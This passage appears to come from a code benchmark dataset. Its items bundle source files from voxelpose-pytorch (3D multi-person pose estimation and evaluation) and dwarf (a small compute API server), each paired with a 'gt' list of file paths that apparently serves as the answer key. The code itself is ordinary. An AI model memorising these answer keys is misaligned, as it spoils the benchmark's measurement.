        "content": "'voxelpose-pytorch/lib/dataset/panoptic.py'\n:\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport glob\nimport os.path as osp\nimport numpy as np\nimport json_tricks as json\nimport pickle\nimport logging\nimport os\nimport copy\n\nfrom dataset.JointsDataset import JointsDataset\nfrom utils.transforms import projectPoints\n\nlogger = logging.getLogger(__name__)\n\nTRAIN_LIST = [\n    '160422_ultimatum1',\n    '160224_haggling1',\n    '160226_haggling1',\n    '161202_haggling1',\n    '160906_ian1',\n    '160906_ian2',\n    '160906_ian3',\n    '160906_band1',\n    '160906_band2',\n    '160906_band3',\n]\nVAL_LIST = ['160906_pizza1', '160422_haggling1', '160906_ian5', '160906_band4']\n\nJOINTS_DEF = {\n    'neck': 0,\n    'nose': 1,\n    'mid-hip': 2,\n    'l-shoulder': 3,\n    'l-elbow': 4,\n    'l-wrist': 5,\n    'l-hip': 6,\n    'l-knee': 7,\n    'l-ankle': 8,\n    'r-shoulder': 9,\n    'r-elbow': 10,\n    'r-wrist': 11,\n    'r-hip': 12,\n    'r-knee': 13,\n    'r-ankle': 14,\n\n\n\n\n}\n\nLIMBS = [[0, 1],\n         [0, 2],\n         [0, 3],\n         [3, 4],\n         [4, 5],\n         [0, 9],\n         [9, 10],\n         [10, 11],\n         [2, 6],\n         [2, 12],\n         [6, 7],\n         [7, 8],\n         [12, 13],\n         [13, 14]]\n\n\nclass Panoptic(JointsDataset):\n    def __init__(self, cfg, image_set, is_train, transform=None):\n        super().__init__(cfg, image_set, is_train, transform)\n        self.pixel_std = 200.0\n        self.joints_def = JOINTS_DEF\n        self.limbs = LIMBS\n        self.num_joints = len(JOINTS_DEF)\n\n        if self.image_set == 'train':\n            self.sequence_list = TRAIN_LIST\n            self._interval = 3\n            self.cam_list = [(0, 12), (0, 6), (0, 23), (0, 13), (0, 3)][:self.num_views]\n\n\n            self.num_views = len(self.cam_list)\n        elif self.image_set == 'validation':\n            self.sequence_list = VAL_LIST\n            self._interval = 12\n            self.cam_list = [(0, 12), (0, 6), (0, 23), (0, 13), (0, 3)][:self.num_views]\n            self.num_views = len(self.cam_list)\n\n        self.db_file = 'group_{}_cam{}.pkl'.format(self.image_set, self.num_views)\n        self.db_file = os.path.join(self.dataset_root, self.db_file)\n\n        if osp.exists(self.db_file):\n            info = pickle.load(open(self.db_file, 'rb'))\n            assert info['sequence_list'] == self.sequence_list\n            assert info['interval'] == self._interval\n            assert info['cam_list'] == self.cam_list\n            self.db = info['db']\n        else:\n            self.db = self._get_db()\n            info = {\n                'sequence_list': self.sequence_list,\n                'interval': self._interval,\n                'cam_list': self.cam_list,\n                'db': self.db\n            }\n            pickle.dump(info, open(self.db_file, 'wb'))\n\n        self.db_size = len(self.db)\n\n    def _get_db(self):\n        width = 1920\n        height = 1080\n        db = []\n        for seq in self.sequence_list:\n\n            cameras = self._get_cam(seq)\n\n            curr_anno = osp.join(self.dataset_root, seq, 'hdPose3d_stage1_coco19')\n            anno_files = sorted(glob.iglob('{:s}/*.json'.format(curr_anno)))\n\n            for i, file in enumerate(anno_files):\n                if i % self._interval == 0:\n                    with open(file) as dfile:\n                        bodies = json.load(dfile)['bodies']\n                    if len(bodies) == 0:\n                        continue\n\n                    for k, v in cameras.items():\n                        postfix = osp.basename(file).replace('body3DScene', '')\n                        prefix = '{:02d}_{:02d}'.format(k[0], k[1])\n                        image = osp.join(seq, 'hdImgs', prefix,\n                                         prefix + postfix)\n                        image = image.replace('json', 'jpg')\n\n                        all_poses_3d = []\n                        all_poses_vis_3d = []\n                        all_poses = []\n                        all_poses_vis = []\n                        for body in bodies:\n                            pose3d = np.array(body['joints19']).reshape((-1, 4))\n                            pose3d = pose3d[:self.num_joints]\n\n                            joints_vis = pose3d[:, -1] > 0.1\n\n                            if not joints_vis[self.root_id]:\n                                continue\n\n\n                            M = np.array([[1.0, 0.0, 0.0],\n                                          [0.0, 0.0, -1.0],\n                                          [0.0, 1.0, 0.0]])\n                            pose3d[:, 0:3] = pose3d[:, 0:3].dot(M)\n\n                            all_poses_3d.append(pose3d[:, 0:3] * 10.0)\n                            all_poses_vis_3d.append(\n                                np.repeat(\n                                    np.reshape(joints_vis, (-1, 1)), 3, axis=1))\n\n                            pose2d = np.zeros((pose3d.shape[0], 2))\n                            pose2d[:, :2] = projectPoints(\n                                pose3d[:, 0:3].transpose(), v['K'], v['R'],\n                                v['t'], v['distCoef']).transpose()[:, :2]\n                            x_check = np.bitwise_and(pose2d[:, 0] >= 0,\n                                                     pose2d[:, 0] <= width - 1)\n                            y_check = np.bitwise_and(pose2d[:, 1] >= 0,\n                                                     pose2d[:, 1] <= height - 1)\n                            check = np.bitwise_and(x_check, y_check)\n                            joints_vis[np.logical_not(check)] = 0\n\n                            all_poses.append(pose2d)\n                            all_poses_vis.append(\n                                np.repeat(\n                                    np.reshape(joints_vis, (-1, 1)), 2, axis=1))\n\n                        if len(all_poses_3d) > 0:\n                            our_cam = {}\n                            our_cam['R'] = v['R']\n                            our_cam['T'] = -np.dot(v['R'].T, v['t']) * 10.0\n                            our_cam['fx'] = np.array(v['K'][0, 0])\n                            our_cam['fy'] = np.array(v['K'][1, 1])\n                            our_cam['cx'] = np.array(v['K'][0, 2])\n                            our_cam['cy'] = np.array(v['K'][1, 2])\n                            our_cam['k'] = v['distCoef'][[0, 1, 4]].reshape(3, 1)\n                            our_cam['p'] = v['distCoef'][[2, 3]].reshape(2, 1)\n\n                            db.append({\n                                'key': \"{}_{}{}\".format(seq, prefix, postfix.split('.')[0]),\n                                'image': osp.join(self.dataset_root, image),\n                                'joints_3d': all_poses_3d,\n                                'joints_3d_vis': all_poses_vis_3d,\n                                'joints_2d': all_poses,\n                                'joints_2d_vis': all_poses_vis,\n                                'camera': our_cam\n                            })\n        return db\n\n    def _get_cam(self, seq):\n        cam_file = osp.join(self.dataset_root, seq, 'calibration_{:s}.json'.format(seq))\n        with open(cam_file) as cfile:\n            calib = json.load(cfile)\n\n        M = np.array([[1.0, 0.0, 0.0],\n                      [0.0, 0.0, -1.0],\n                      [0.0, 1.0, 0.0]])\n        cameras = {}\n        for cam in calib['cameras']:\n            if (cam['panel'], cam['node']) in self.cam_list:\n                sel_cam = {}\n                sel_cam['K'] = np.array(cam['K'])\n                sel_cam['distCoef'] = np.array(cam['distCoef'])\n                sel_cam['R'] = np.array(cam['R']).dot(M)\n                sel_cam['t'] = np.array(cam['t']).reshape((3, 1))\n                cameras[(cam['panel'], cam['node'])] = sel_cam\n        return cameras\n\n    def __getitem__(self, idx):\n        input, target, weight, target_3d, meta, input_heatmap = [], [], [], [], [], []\n\n\n\n\n\n\n\n        for k in range(self.num_views):\n            i, t, w, t3, m, ih = super().__getitem__(self.num_views * idx + k)\n            if i is None:\n                continue\n            input.append(i)\n            target.append(t)\n            weight.append(w)\n            target_3d.append(t3)\n            meta.append(m)\n            input_heatmap.append(ih)\n        return input, target, weight, target_3d, meta, input_heatmap\n\n    def __len__(self):\n        return self.db_size // self.num_views\n\n    def evaluate(self, preds):\n        eval_list = []\n        gt_num = self.db_size // self.num_views\n        assert len(preds) == gt_num, 'number mismatch'\n\n        total_gt = 0\n        for i in range(gt_num):\n            index = self.num_views * i\n            db_rec = copy.deepcopy(self.db[index])\n            joints_3d = db_rec['joints_3d']\n            joints_3d_vis = db_rec['joints_3d_vis']\n\n            if len(joints_3d) == 0:\n                continue\n\n            pred = preds[i].copy()\n            pred = pred[pred[:, 0, 3] >= 0]\n            for pose in pred:\n                mpjpes = []\n                for (gt, gt_vis) in zip(joints_3d, joints_3d_vis):\n                    vis = gt_vis[:, 0] > 0\n                    mpjpe = np.mean(np.sqrt(np.sum((pose[vis, 0:3] - gt[vis]) ** 2, axis=-1)))\n                    mpjpes.append(mpjpe)\n                min_gt = np.argmin(mpjpes)\n                min_mpjpe = np.min(mpjpes)\n                score = pose[0, 4]\n                eval_list.append({\n                    \"mpjpe\": float(min_mpjpe),\n                    \"score\": float(score),\n                    \"gt_id\": int(total_gt + min_gt)\n                })\n\n            total_gt += len(joints_3d)\n\n        mpjpe_threshold = np.arange(25, 155, 25)\n        aps = []\n        recs = []\n        for t in mpjpe_threshold:\n            ap, rec = self._eval_list_to_ap(eval_list, total_gt, t)\n            aps.append(ap)\n            recs.append(rec)\n\n        return aps, recs, self._eval_list_to_mpjpe(eval_list), self._eval_list_to_recall(eval_list, total_gt)\n\n    @staticmethod\n    def _eval_list_to_ap(eval_list, total_gt, threshold):\n        eval_list.sort(key=lambda k: k[\"score\"], reverse=True)\n        total_num = len(eval_list)\n\n        tp = np.zeros(total_num)\n        fp = np.zeros(total_num)\n        gt_det = []\n        for i, item in enumerate(eval_list):\n            if item[\"mpjpe\"] < threshold and item[\"gt_id\"] not in gt_det:\n                tp[i] = 1\n                gt_det.append(item[\"gt_id\"])\n            else:\n                fp[i] = 1\n        tp = np.cumsum(tp)\n        fp = np.cumsum(fp)\n        recall = tp / (total_gt + 1e-5)\n        precise = tp / (tp + fp + 1e-5)\n        for n in range(total_num - 2, -1, -1):\n            precise[n] = max(precise[n], precise[n + 1])\n\n        precise = np.concatenate(([0], precise, [0]))\n        recall = np.concatenate(([0], recall, [1]))\n        index = np.where(recall[1:] != recall[:-1])[0]\n        ap = np.sum((recall[index + 1] - recall[index]) * precise[index + 1])\n\n        return ap, recall[-2]\n\n    @staticmethod\n    def _eval_list_to_mpjpe(eval_list, threshold=500):\n        eval_list.sort(key=lambda k: k[\"score\"], reverse=True)\n        gt_det = []\n\n        mpjpes = []\n        for i, item in enumerate(eval_list):\n            if item[\"mpjpe\"] < threshold and item[\"gt_id\"] not in gt_det:\n                mpjpes.append(item[\"mpjpe\"])\n                gt_det.append(item[\"gt_id\"])\n\n        return np.mean(mpjpes) if len(mpjpes) > 0 else np.inf\n\n    @staticmethod\n    def _eval_list_to_recall(eval_list, total_gt, threshold=500):\n        gt_ids = [e[\"gt_id\"] for e in eval_list if e[\"mpjpe\"] < threshold]\n\n        return len(np.unique(gt_ids)) / total_gt\n\n\n\n\n\n'voxelpose-pytorch/lib/dataset/__init__.py'\n:\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nfrom dataset.panoptic import Panoptic as panoptic\nfrom dataset.shelf_synthetic import ShelfSynthetic as shelf_synthetic\nfrom dataset.campus_synthetic import CampusSynthetic as campus_synthetic\nfrom dataset.shelf import Shelf as shelf\nfrom dataset.campus import Campus as campus\n\n'voxelpose-pytorch/test/evaluate.py'\n:\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport numpy as np\nimport torch\nimport torch.backends.cudnn as cudnn\nimport torch.utils.data\nimport torch.utils.data.distributed\nimport torchvision.transforms as transforms\nimport argparse\nimport os\nfrom tqdm import tqdm\nfrom prettytable import PrettyTable\nimport copy\n\nimport _init_paths\nfrom core.config import config\nfrom core.config import update_config\nfrom utils.utils import create_logger, load_backbone_panoptic\nimport dataset\nimport models\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description='Train keypoints network')\n    parser.add_argument(\n        '--cfg', help='experiment configure file name', required=True, type=str)\n\n    args, rest = parser.parse_known_args()\n    update_config(args.cfg)\n\n    return args\n\n\ndef main():\n    args = parse_args()\n    logger, final_output_dir, tb_log_dir = create_logger(\n        config, args.cfg, 'eval_map')\n    cfg_name = os.path.basename(args.cfg).split('.')[0]\n\n    gpus = [int(i) for i in config.GPUS.split(',')]\n    print('=> Loading data ..')\n    normalize = transforms.Normalize(\n        mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225])\n\n    test_dataset = eval('dataset.' + config.DATASET.TEST_DATASET)(\n        config, config.DATASET.TEST_SUBSET, False,\n        transforms.Compose([\n            transforms.ToTensor(),\n            normalize,\n        ]))\n\n    test_loader = torch.utils.data.DataLoader(\n        test_dataset,\n        batch_size=config.TEST.BATCH_SIZE * len(gpus),\n        shuffle=False,\n        num_workers=config.WORKERS,\n        pin_memory=True)\n\n    cudnn.benchmark = config.CUDNN.BENCHMARK\n    torch.backends.cudnn.deterministic = config.CUDNN.DETERMINISTIC\n    torch.backends.cudnn.enabled = config.CUDNN.ENABLED\n\n    print('=> Constructing models ..')\n    model = eval('models.' + config.MODEL + '.get_multi_person_pose_net')(\n        config, is_train=True)\n    with torch.no_grad():\n        model = torch.nn.DataParallel(model, device_ids=gpus).cuda()\n\n    test_model_file = os.path.join(final_output_dir, config.TEST.MODEL_FILE)\n    if config.TEST.MODEL_FILE and os.path.isfile(test_model_file):\n        logger.info('=> load models state {}'.format(test_model_file))\n        model.module.load_state_dict(torch.load(test_model_file))\n    else:\n        raise ValueError('Check the model file for testing!')\n\n    model.eval()\n    preds = []\n    with torch.no_grad():\n        for i, (inputs, targets_2d, weights_2d, targets_3d, meta, input_heatmap) in enumerate(tqdm(test_loader)):\n            if 'panoptic' in config.DATASET.TEST_DATASET:\n                pred, _, _, _, _, _ = model(views=inputs, meta=meta)\n            elif 'campus' in config.DATASET.TEST_DATASET or 'shelf' in config.DATASET.TEST_DATASET:\n                pred, _, _, _, _, _ = model(meta=meta, input_heatmaps=input_heatmap)\n\n            pred = pred.detach().cpu().numpy()\n            for b in range(pred.shape[0]):\n                preds.append(pred[b])\n\n        tb = PrettyTable()\n        if 'panoptic' in config.DATASET.TEST_DATASET:\n            mpjpe_threshold = np.arange(25, 155, 25)\n            aps, recs, mpjpe, _ = test_dataset.evaluate(preds)\n            tb.field_names = ['Threshold/mm'] + [f'{i}' for i in mpjpe_threshold]\n            tb.add_row(['AP'] + [f'{ap * 100:.2f}' for ap in aps])\n            tb.add_row(['Recall'] + [f'{re * 100:.2f}' for re in recs])\n            print(tb)\n            print(f'MPJPE: {mpjpe:.2f}mm')\n        else:\n            actor_pcp, avg_pcp, bone_person_pcp, _ = test_dataset.evaluate(preds)\n            tb.field_names = ['Bone Group'] + [f'Actor {i+1}' for i in range(len(actor_pcp))] + ['Average']\n            for k, v in bone_person_pcp.items():\n                tb.add_row([k] + [f'{i*100:.1f}' for i in v] + [f'{np.mean(v)*100:.1f}'])\n            tb.add_row(['Total'] + [f'{i*100:.1f}' for i in actor_pcp] + [f'{avg_pcp*100:.1f}'])\n            print(tb)\n\n\nif __name__ == \"__main__\":\n    main()\n\n'voxelpose-pytorch/lib/utils/transforms.py'\n:\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport numpy as np\nimport cv2\n\nimport torch\n\n\ndef flip_back(output_flipped, matched_parts):\n\n    assert output_flipped.ndim == 4,\\\n        'output_flipped should be [batch_size, num_joints, height, width]'\n\n    output_flipped = output_flipped[:, :, :, ::-1]\n\n    for pair in matched_parts:\n        tmp = output_flipped[:, pair[0], :, :].copy()\n        output_flipped[:, pair[0], :, :] = output_flipped[:, pair[1], :, :]\n        output_flipped[:, pair[1], :, :] = tmp\n\n    return output_flipped\n\n\ndef fliplr_joints(joints, joints_vis, width, matched_parts):\n\n\n    joints[:, 0] = width - joints[:, 0] - 1\n\n\n    for pair in matched_parts:\n        joints[pair[0], :], joints[pair[1], :] = \\\n            joints[pair[1], :], joints[pair[0], :].copy()\n        joints_vis[pair[0], :], joints_vis[pair[1], :] = \\\n            joints_vis[pair[1], :], joints_vis[pair[0], :].copy()\n\n    return joints * joints_vis, joints_vis\n\n\ndef transform_preds(coords, center, scale, output_size):\n    target_coords = np.zeros(coords.shape)\n    trans = get_affine_transform(center, scale, 0, output_size, inv=1)\n    for p in range(coords.shape[0]):\n        target_coords[p, 0:2] = affine_transform(coords[p, 0:2], trans)\n    return target_coords\n\n\ndef get_affine_transform(center,\n                         scale,\n                         rot,\n                         output_size,\n                         shift=np.array([0, 0], dtype=np.float32),\n                         inv=0):\n    if isinstance(scale, torch.Tensor):\n        scale = np.array(scale.cpu())\n    if isinstance(center, torch.Tensor):\n        center = np.array(center.cpu())\n    if not isinstance(scale, np.ndarray) and not isinstance(scale, list):\n        scale = np.array([scale, scale])\n\n    scale_tmp = scale * 200.0\n    src_w, src_h = scale_tmp[0], scale_tmp[1]\n    dst_w, dst_h = output_size[0], output_size[1]\n\n    rot_rad = np.pi * rot / 180\n    if src_w >= src_h:\n        src_dir = get_dir([0, src_w * -0.5], rot_rad)\n        dst_dir = np.array([0, dst_w * -0.5], np.float32)\n    else:\n        src_dir = get_dir([src_h * -0.5, 0], rot_rad)\n        dst_dir = np.array([dst_h * -0.5, 0], np.float32)\n\n    src = np.zeros((3, 2), dtype=np.float32)\n    dst = np.zeros((3, 2), dtype=np.float32)\n    src[0, :] = center + scale_tmp * shift\n    src[1, :] = center + src_dir + scale_tmp * shift\n    dst[0, :] = [dst_w * 0.5, dst_h * 0.5]\n    dst[1, :] = np.array([dst_w * 0.5, dst_h * 0.5]) + dst_dir\n\n    src[2:, :] = get_3rd_point(src[0, :], src[1, :])\n    dst[2:, :] = get_3rd_point(dst[0, :], dst[1, :])\n\n    if inv:\n        trans = cv2.getAffineTransform(np.float32(dst), np.float32(src))\n    else:\n        trans = cv2.getAffineTransform(np.float32(src), np.float32(dst))\n\n    return trans\n\n\ndef affine_transform(pt, t):\n    new_pt = np.array([pt[0], pt[1], 1.]).T\n    new_pt = np.dot(t, new_pt)\n    return new_pt[:2]\n\n\ndef affine_transform_pts(pts, t):\n    xyz = np.add(\n        np.array([[1, 0], [0, 1], [0, 0]]).dot(pts.T), np.array([[0], [0],\n                                                                 [1]]))\n    return np.dot(t, xyz).T\n\n\ndef affine_transform_pts_cuda(pts, t):\n    npts = pts.shape[0]\n    pts_homo = torch.cat([pts, torch.ones(npts, 1, device=pts.device)], dim=1)\n    out = torch.mm(t, torch.t(pts_homo))\n    return torch.t(out[:2, :])\n\n\ndef get_3rd_point(a, b):\n    direct = a - b\n    return np.array(b) + np.array([-direct[1], direct[0]], dtype=np.float32)\n\n\ndef get_dir(src_point, rot_rad):\n    sn, cs = np.sin(rot_rad), np.cos(rot_rad)\n\n    src_result = [0, 0]\n    src_result[0] = src_point[0] * cs - src_point[1] * sn\n    src_result[1] = src_point[0] * sn + src_point[1] * cs\n\n    return src_result\n\n\ndef crop(img, center, scale, output_size, rot=0):\n    trans = get_affine_transform(center, scale, rot, output_size)\n\n    dst_img = cv2.warpAffine(\n        img,\n        trans, (int(output_size[0]), int(output_size[1])),\n        flags=cv2.INTER_LINEAR)\n\n    return dst_img\n\ndef get_scale(image_size, resized_size):\n    w, h = image_size\n    w_resized, h_resized = resized_size\n    if w / w_resized < h / h_resized:\n        w_pad = h / h_resized * w_resized\n        h_pad = h\n    else:\n        w_pad = w\n        h_pad = w / w_resized * h_resized\n    scale = np.array([w_pad / 200.0, h_pad / 200.0], dtype=np.float32)\n\n    return scale\n\n\ndef projectPoints(X, K, R, t, Kd):\n\n\n    x = np.dot(R, X) + t\n\n    x[0:2, :] = x[0:2, :] / (x[2, :] + 1e-5)\n\n    r = x[0, :] * x[0, :] + x[1, :] * x[1, :]\n\n    x[0, :] = x[0, :] * (1 + Kd[0] * r + Kd[1] * r * r + Kd[4] * r * r * r\n                        ) + 2 * Kd[2] * x[0, :] * x[1, :] + Kd[3] * (\n                            r + 2 * x[0, :] * x[0, :])\n    x[1, :] = x[1, :] * (1 + Kd[0] * r + Kd[1] * r * r + Kd[4] * r * r * r\n                        ) + 2 * Kd[3] * x[0, :] * x[1, :] + Kd[2] * (\n                            r + 2 * x[1, :] * x[1, :])\n\n    x[0, :] = K[0, 0] * x[0, :] + K[0, 1] * x[1, :] + K[0, 2]\n    x[1, :] = K[1, 0] * x[0, :] + K[1, 1] * x[1, :] + K[1, 2]\n\n    return x\n\n\ndef rotate_points(points, center, rot_rad):\n\n    rot_rad = rot_rad * np.pi / 180.0\n    rotate_mat = np.array([[np.cos(rot_rad), -np.sin(rot_rad)],\n                          [np.sin(rot_rad), np.cos(rot_rad)]])\n    center = center.reshape(2, 1)\n    points = points.T\n    points = rotate_mat.dot(points - center) + center\n\n    return points.T\n\n\ndef compute_similarity_transform(X, Y, compute_optimal_scale=False):\n\n    muX = X.mean(0)\n    muY = Y.mean(0)\n\n    X0 = X - muX\n    Y0 = Y - muY\n\n    ssX = (X0 ** 2.).sum()\n    ssY = (Y0 ** 2.).sum()\n\n\n    normX = np.sqrt(ssX)\n    normY = np.sqrt(ssY)\n\n\n    X0 = X0 / normX\n    Y0 = Y0 / normY\n\n\n    A = np.dot(X0.T, Y0)\n    U, s, Vt = np.linalg.svd(A, full_matrices=False)\n    V = Vt.T\n    T = np.dot(V, U.T)\n\n\n    detT = np.linalg.det(T)\n    V[:, -1] *= np.sign(detT)\n    s[-1] *= np.sign(detT)\n    T = np.dot(V, U.T)\n\n    traceTA = s.sum()\n\n    if compute_optimal_scale:\n        b = traceTA * normX / normY\n        d = 1 - traceTA ** 2\n        Z = normX * traceTA * np.dot(Y0, T) + muX\n    else:\n        b = 1\n        d = 1 + ssY / ssX - 2 * traceTA * normY / normX\n        Z = normY * np.dot(Y0, T) + muX\n\n    c = muX - b * np.dot(muY, T)\n\n    return d, Z, T, b, c\n\n\ndef procrustes_transform(target_pose, from_pose):\n    _, Z, rot, s, t = compute_similarity_transform(target_pose, from_pose, compute_optimal_scale=True)\n    align_pose = s * from_pose.dot(rot) + t\n\n    return align_pose\n",
        "gt": [
            "'voxelpose-pytorch/lib/utils/transforms.py'",
            "'voxelpose-pytorch/lib/dataset/panoptic.py'",
            "'voxelpose-pytorch/lib/dataset/__init__.py'",
            "'voxelpose-pytorch/test/evaluate.py'"
        ]
    },
    {
        "files": [
            "'dwarf/tests/api/test_compute.py'",
            "'dwarf/dwarf/api_server.py'",
            "'dwarf/dwarf/compute/servers.py'",
            "'dwarf/dwarf/compute/api.py'"
        ],
        "content": "'dwarf/tests/api/test_compute.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport json\n\nfrom webtest import TestApp\n\nfrom tests import utils\n\nfrom dwarf.api_server import ApiServer\n\nVERSION_RESP = {\n    'id': 'v2.0',\n    'links': [\n        {\n            'href': 'http://127.0.0.1:20000/compute/v2.0/',\n            'rel': 'self',\n        },\n    ],\n    'status': 'CURRENT',\n    'updated': '2016-05-11T00:00:00Z',\n}\n\n\ndef list_versions_resp():\n    return {'versions': [VERSION_RESP]}\n\n\ndef show_version_resp():\n    return {'version': VERSION_RESP}\n\n\nclass DwarfTestCase(utils.TestCase):\n\n    def setUp(self):\n        super(DwarfTestCase, self).setUp()\n        self.app = TestApp(ApiServer().app)\n\n\n\n\n\n    def test_list_versions(self):\n        resp = self.app.get('/compute', status=300)\n        self.assertEqual(json.loads(resp.body), list_versions_resp())\n\n    def test_show_version(self):\n        resp = self.app.get('/compute/v2.0', status=200)\n        self.assertEqual(json.loads(resp.body), show_version_resp())\n\n'dwarf/dwarf/api_server.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport bottle\nimport logging\nimport socket\nimport threading\nimport time\nimport urllib2\n\nfrom wsgiref.simple_server import WSGIServer, WSGIRequestHandler\n\nfrom dwarf import config\n\nfrom dwarf.compute import api as api_compute\nfrom dwarf.identity import api as api_identity\nfrom dwarf.image import api as api_image\n\nCONF = config.Config()\nLOG = logging.getLogger(__name__)\n\n\nclass _HTTPRequestHandler(WSGIRequestHandler):\n\n    def log_request(self, code='-', size='-'):\n        LOG.info('%s from %s to http://%s:%s%s %s %s',\n                 self.command,\n                 self.client_address[0],\n                 self.server.server_address[0],\n                 self.server.server_address[1],\n                 self.path,\n                 code,\n                 size)\n\n\nclass _HTTPServer(bottle.ServerAdapter):\n\n    srv = None\n    app = None\n\n    def run(self, handler):\n\n        WSGIServer.allow_reuse_address = 1\n\n\n        self.srv = WSGIServer((self.host, self.port), _HTTPRequestHandler)\n        self.srv.set_app(self.app)\n        try:\n            self.srv.serve_forever()\n        finally:\n            self.srv.server_close()\n\n    def stop(self):\n        if self.srv:\n            self.srv.shutdown()\n\n\nclass ApiServer(threading.Thread):\n\n\n    def __init__(self, quiet=False):\n        threading.Thread.__init__(self)\n\n        self.quiet = quiet\n\n        self.daemon = True\n        self.server = None\n        self.app = bottle.Bottle()\n        self.host = CONF.bind_host\n        self.port = CONF.bind_port\n\n\n        api_compute.set_routes(self.app)\n        api_identity.set_routes(self.app)\n        api_image.set_routes(self.app)\n\n    def setup(self):\n        api_compute.setup()\n        api_identity.setup()\n        api_image.setup()\n\n    def teardown(self):\n        api_compute.teardown()\n        api_identity.teardown()\n        api_image.teardown()\n\n    def run(self):\n\n        try:\n            self.setup()\n        except Exception:\n            LOG.exception('Failed to setup API server')\n            return\n\n        LOG.info('Starting API server')\n        try:\n\n\n            sock = socket.socket(socket.AF_INET)\n\n\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            for i in range(1, 100):\n                try:\n                    sock.bind((self.host, self.port))\n                    sock.close()\n                    break\n                except Exception:\n\n                    if i == 30:\n                        raise\n                    time.sleep(1)\n\n\n            self.server = _HTTPServer(host=self.host, port=self.port)\n            self.server.app = self.app\n\n\n            LOG.info('API server listening on %s:%s', self.host, self.port)\n            bottle.run(server=self.server, quiet=self.quiet)\n            LOG.info('API server shut down')\n\n        except Exception:\n            LOG.exception('Failed to start API server')\n\n        finally:\n            self.teardown()\n\n    def stop(self):\n\n        if self.is_alive():\n            LOG.info('Stopping API server')\n            self.server.stop()\n\n    def is_active(self):\n\n        if not self.is_alive():\n            return False\n\n        try:\n            urllib2.urlopen('http://%s:%d/' % (self.host, self.port),\n                            timeout=2)\n        except urllib2.HTTPError:\n\n            pass\n        except Exception:\n\n            return False\n\n        return True\n\n'dwarf/dwarf/compute/servers.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport json\nimport logging\nimport random\nimport os\nimport shutil\nimport time\n\nfrom dwarf import config\nfrom dwarf import db\nfrom dwarf import task\nfrom dwarf import utils\n\nfrom dwarf.compute import flavors\nfrom dwarf.compute import keypairs\nfrom dwarf.compute import virt\n\nfrom dwarf.image import images\n\nCONF = config.Config()\nLOG = logging.getLogger(__name__)\n\nSERVER_BUILDING = 'building'\nSERVER_ACTIVE = 'active'\nSERVER_STOPPED = 'stopped'\nSERVER_PAUSED = 'paused'\nSERVER_SUSPENDED = 'suspended'\nSERVER_ERROR = 'error'\n\n_VIRT_SERVER_STATE = {\n    virt.DOMAIN_NOSTATE: SERVER_BUILDING,\n    virt.DOMAIN_RUNNING: SERVER_ACTIVE,\n    virt.DOMAIN_PAUSED: SERVER_PAUSED,\n    virt.DOMAIN_SHUTDOWN: SERVER_STOPPED,\n    virt.DOMAIN_CRASHED: SERVER_ERROR,\n    virt.DOMAIN_SUSPENDED: SERVER_SUSPENDED,\n}\n\n\ndef _generate_mac():\n\n    mac = [0x52, 0x54, 0x00,\n           random.randint(0x00, 0xff),\n           random.randint(0x00, 0xff),\n           random.randint(0x00, 0xff)]\n    return ':'.join(['%02x' % x for x in mac])\n\n\ndef _create_disks(server, image, flavor):\n\n    server_id = server['id']\n    image_id = image['id']\n    image_file = image['file']\n    disk_size = flavor['disk']\n    disk_local_size = flavor.get('ephemeral', 10)\n\n\n\n    base_disk = os.path.join(CONF.instances_base_dir,\n                             '%s_%s' % (image_id, disk_size))\n    if not os.path.exists(base_disk):\n        try:\n            utils.execute(['qemu-img', 'convert', '-O', 'raw', image_file,\n                           base_disk])\n            utils.execute(['qemu-img', 'resize', base_disk, '%sG' % disk_size])\n        except Exception:\n            if os.path.exists(base_disk):\n                os.remove(base_disk)\n            raise\n\n\n\n    base_disk_local = os.path.join(CONF.instances_base_dir,\n                                   'ephemeral_%s' % disk_local_size)\n    if not os.path.exists(base_disk_local):\n        try:\n            utils.execute(['qemu-img', 'create', '-f', 'raw', base_disk_local,\n                           '%sG' % disk_local_size])\n            utils.execute(['mkfs.ext3', '-F', '-L', 'ephemeral0',\n                           base_disk_local])\n        except Exception:\n            if os.path.exists(base_disk_local):\n                os.remove(base_disk_local)\n            raise\n\n\n\n    server_disk = os.path.join(CONF.instances_dir, server_id, 'disk')\n    utils.execute(['qemu-img', 'create', '-f', 'qcow2', '-o',\n                   'cluster_size=2M,backing_file=%s' % base_disk, server_disk])\n\n\n\n    server_disk_local = os.path.join(CONF.instances_dir, server_id,\n                                     'disk.local')\n    utils.execute(['qemu-img', 'create', '-f', 'qcow2', '-o',\n                   'cluster_size=2M,backing_file=%s' % base_disk_local,\n                   server_disk_local])\n\n\ndef _create_config_drive(server, keypair):\n\n    if not (CONF.force_config_drive or server['config_drive'] == 'True'):\n        return\n\n\n    config_data = {\n        'vendor_data': {\n        },\n        'meta_data': {\n            'availability_zone': 'dwarf',\n            'hostname': '%s.dwarflocal' % server['name'],\n            'launch_index': 0,\n            'name': server['name'],\n            'uuid': server['id'],\n        },\n    }\n\n\n    if keypair is not None:\n        config_data['meta_data']['public_keys'] = {\n            keypair['name']: keypair['public_key']\n        }\n\n\n    config_dir = os.path.join('/tmp', 'dwarf-config-drive-%s' % server['id'])\n    if os.path.exists(config_dir):\n        shutil.rmtree(config_dir)\n\n    for version in ['latest', '2013-10-17']:\n        data_dir = os.path.join(config_dir, 'openstack', version)\n        os.makedirs(data_dir)\n        for data in ['vendor_data', 'meta_data']:\n            data_file = os.path.join(data_dir, '%s.json' % data)\n            with open(data_file, 'w') as fh:\n                json.dump(config_data[data], fh)\n\n\n\n    server_disk_config = os.path.join(CONF.instances_dir, server['id'],\n                                      'disk.config')\n    utils.execute(['genisoimage', '-o', server_disk_config, '-ldots',\n                   '-allow-lowercase', '-allow-multidot', '-l', '-quiet', '-J',\n                   '-r', '-V', 'config-2', config_dir])\n\n\n    